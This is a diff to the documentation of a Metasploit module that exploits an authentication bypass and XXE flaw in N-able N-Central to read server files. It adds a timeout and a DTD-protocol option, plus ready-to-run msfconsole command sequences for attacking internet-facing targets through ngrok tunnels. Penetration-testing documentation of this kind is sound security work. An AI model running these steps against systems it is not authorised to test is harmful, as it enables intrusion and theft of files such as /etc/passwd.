@@ -52,6 +52,20 @@ Examples of interesting files that can be read via XXE:
 Directory path where the log file is written (default: `/opt/nable/webapps/ROOT/applianceLog`).
 The module writes the XXE payload to a log file in this directory before triggering it.
 
+## Advanced Options
+
+### XXETriggerTimeout
+
+Maximum time (in seconds) to wait for XXE file read to succeed (default: `10`). The module uses a retry mechanism to wait for the target
+to fetch the DTD and process the XXE payload.
+
+### DTD_PROTO
+
+Protocol to use in DTD URL and for the local server (default: `http`). Options: `http` or `https`.
+The local server SSL is synchronized with this option.
+Note that N-Central (Java) cannot validate self-signed certificates, so HTTPS will only work if you provide a valid certificate via the
+`SSLCert` option that is signed by a trusted certificate authority.
+
 ## Scenarios
 
 ### Local Network Testing
@@ -93,10 +107,42 @@ daemon:x:2:2:daemon:/sbin:/sbin/nologin
 
 ### WAN Testing with ngrok
 
-For testing against targets on the internet, expose your DTD server using ngrok:
+For testing against targets on the internet, expose your DTD server using ngrok. There are two methods:
+
+#### Method 1: ngrok HTTP forwarding
 
 1. Start ngrok: `ngrok http 8080`
-2. Configure `SRVHOST` to your ngrok hostname and `SRVPORT` to your ngrok port
+2. Use the HTTP URL provided by ngrok (e.g., `https://abc123def456.ngrok-free.app`):
+
+```
+use auxiliary/scanner/http/nable_ncentral_auth_bypass_xxe
+set RHOSTS target.example.com
+set RPORT 443
+set SRVHOST 0.0.0.0
+set SRVPORT 8080
+set URIHOST abc123def456.ngrok-free.app
+set URIPORT 443
+run
+```
+
+#### Method 2: ngrok TCP forwarding
+
+1. Start ngrok: `ngrok tcp 7777`
+2. Use the TCP address and port provided by ngrok (e.g., `0.tcp.eu.ngrok.io:12345`):
+
+```
+use auxiliary/scanner/http/nable_ncentral_auth_bypass_xxe
+set RHOSTS target.example.com
+set RPORT 443
+set SRVHOST 0.0.0.0
+set SRVPORT 7777
+set URIHOST 0.tcp.eu.ngrok.io
+set URIPORT 12345
+run
+```
+
+Note: `URIHOST` and `URIPORT` specify the public ngrok address and port that the target will connect to. `SRVHOST` and `SRVPORT` should
+be set to your local listening address and port.
 
 
 ## Troubleshooting
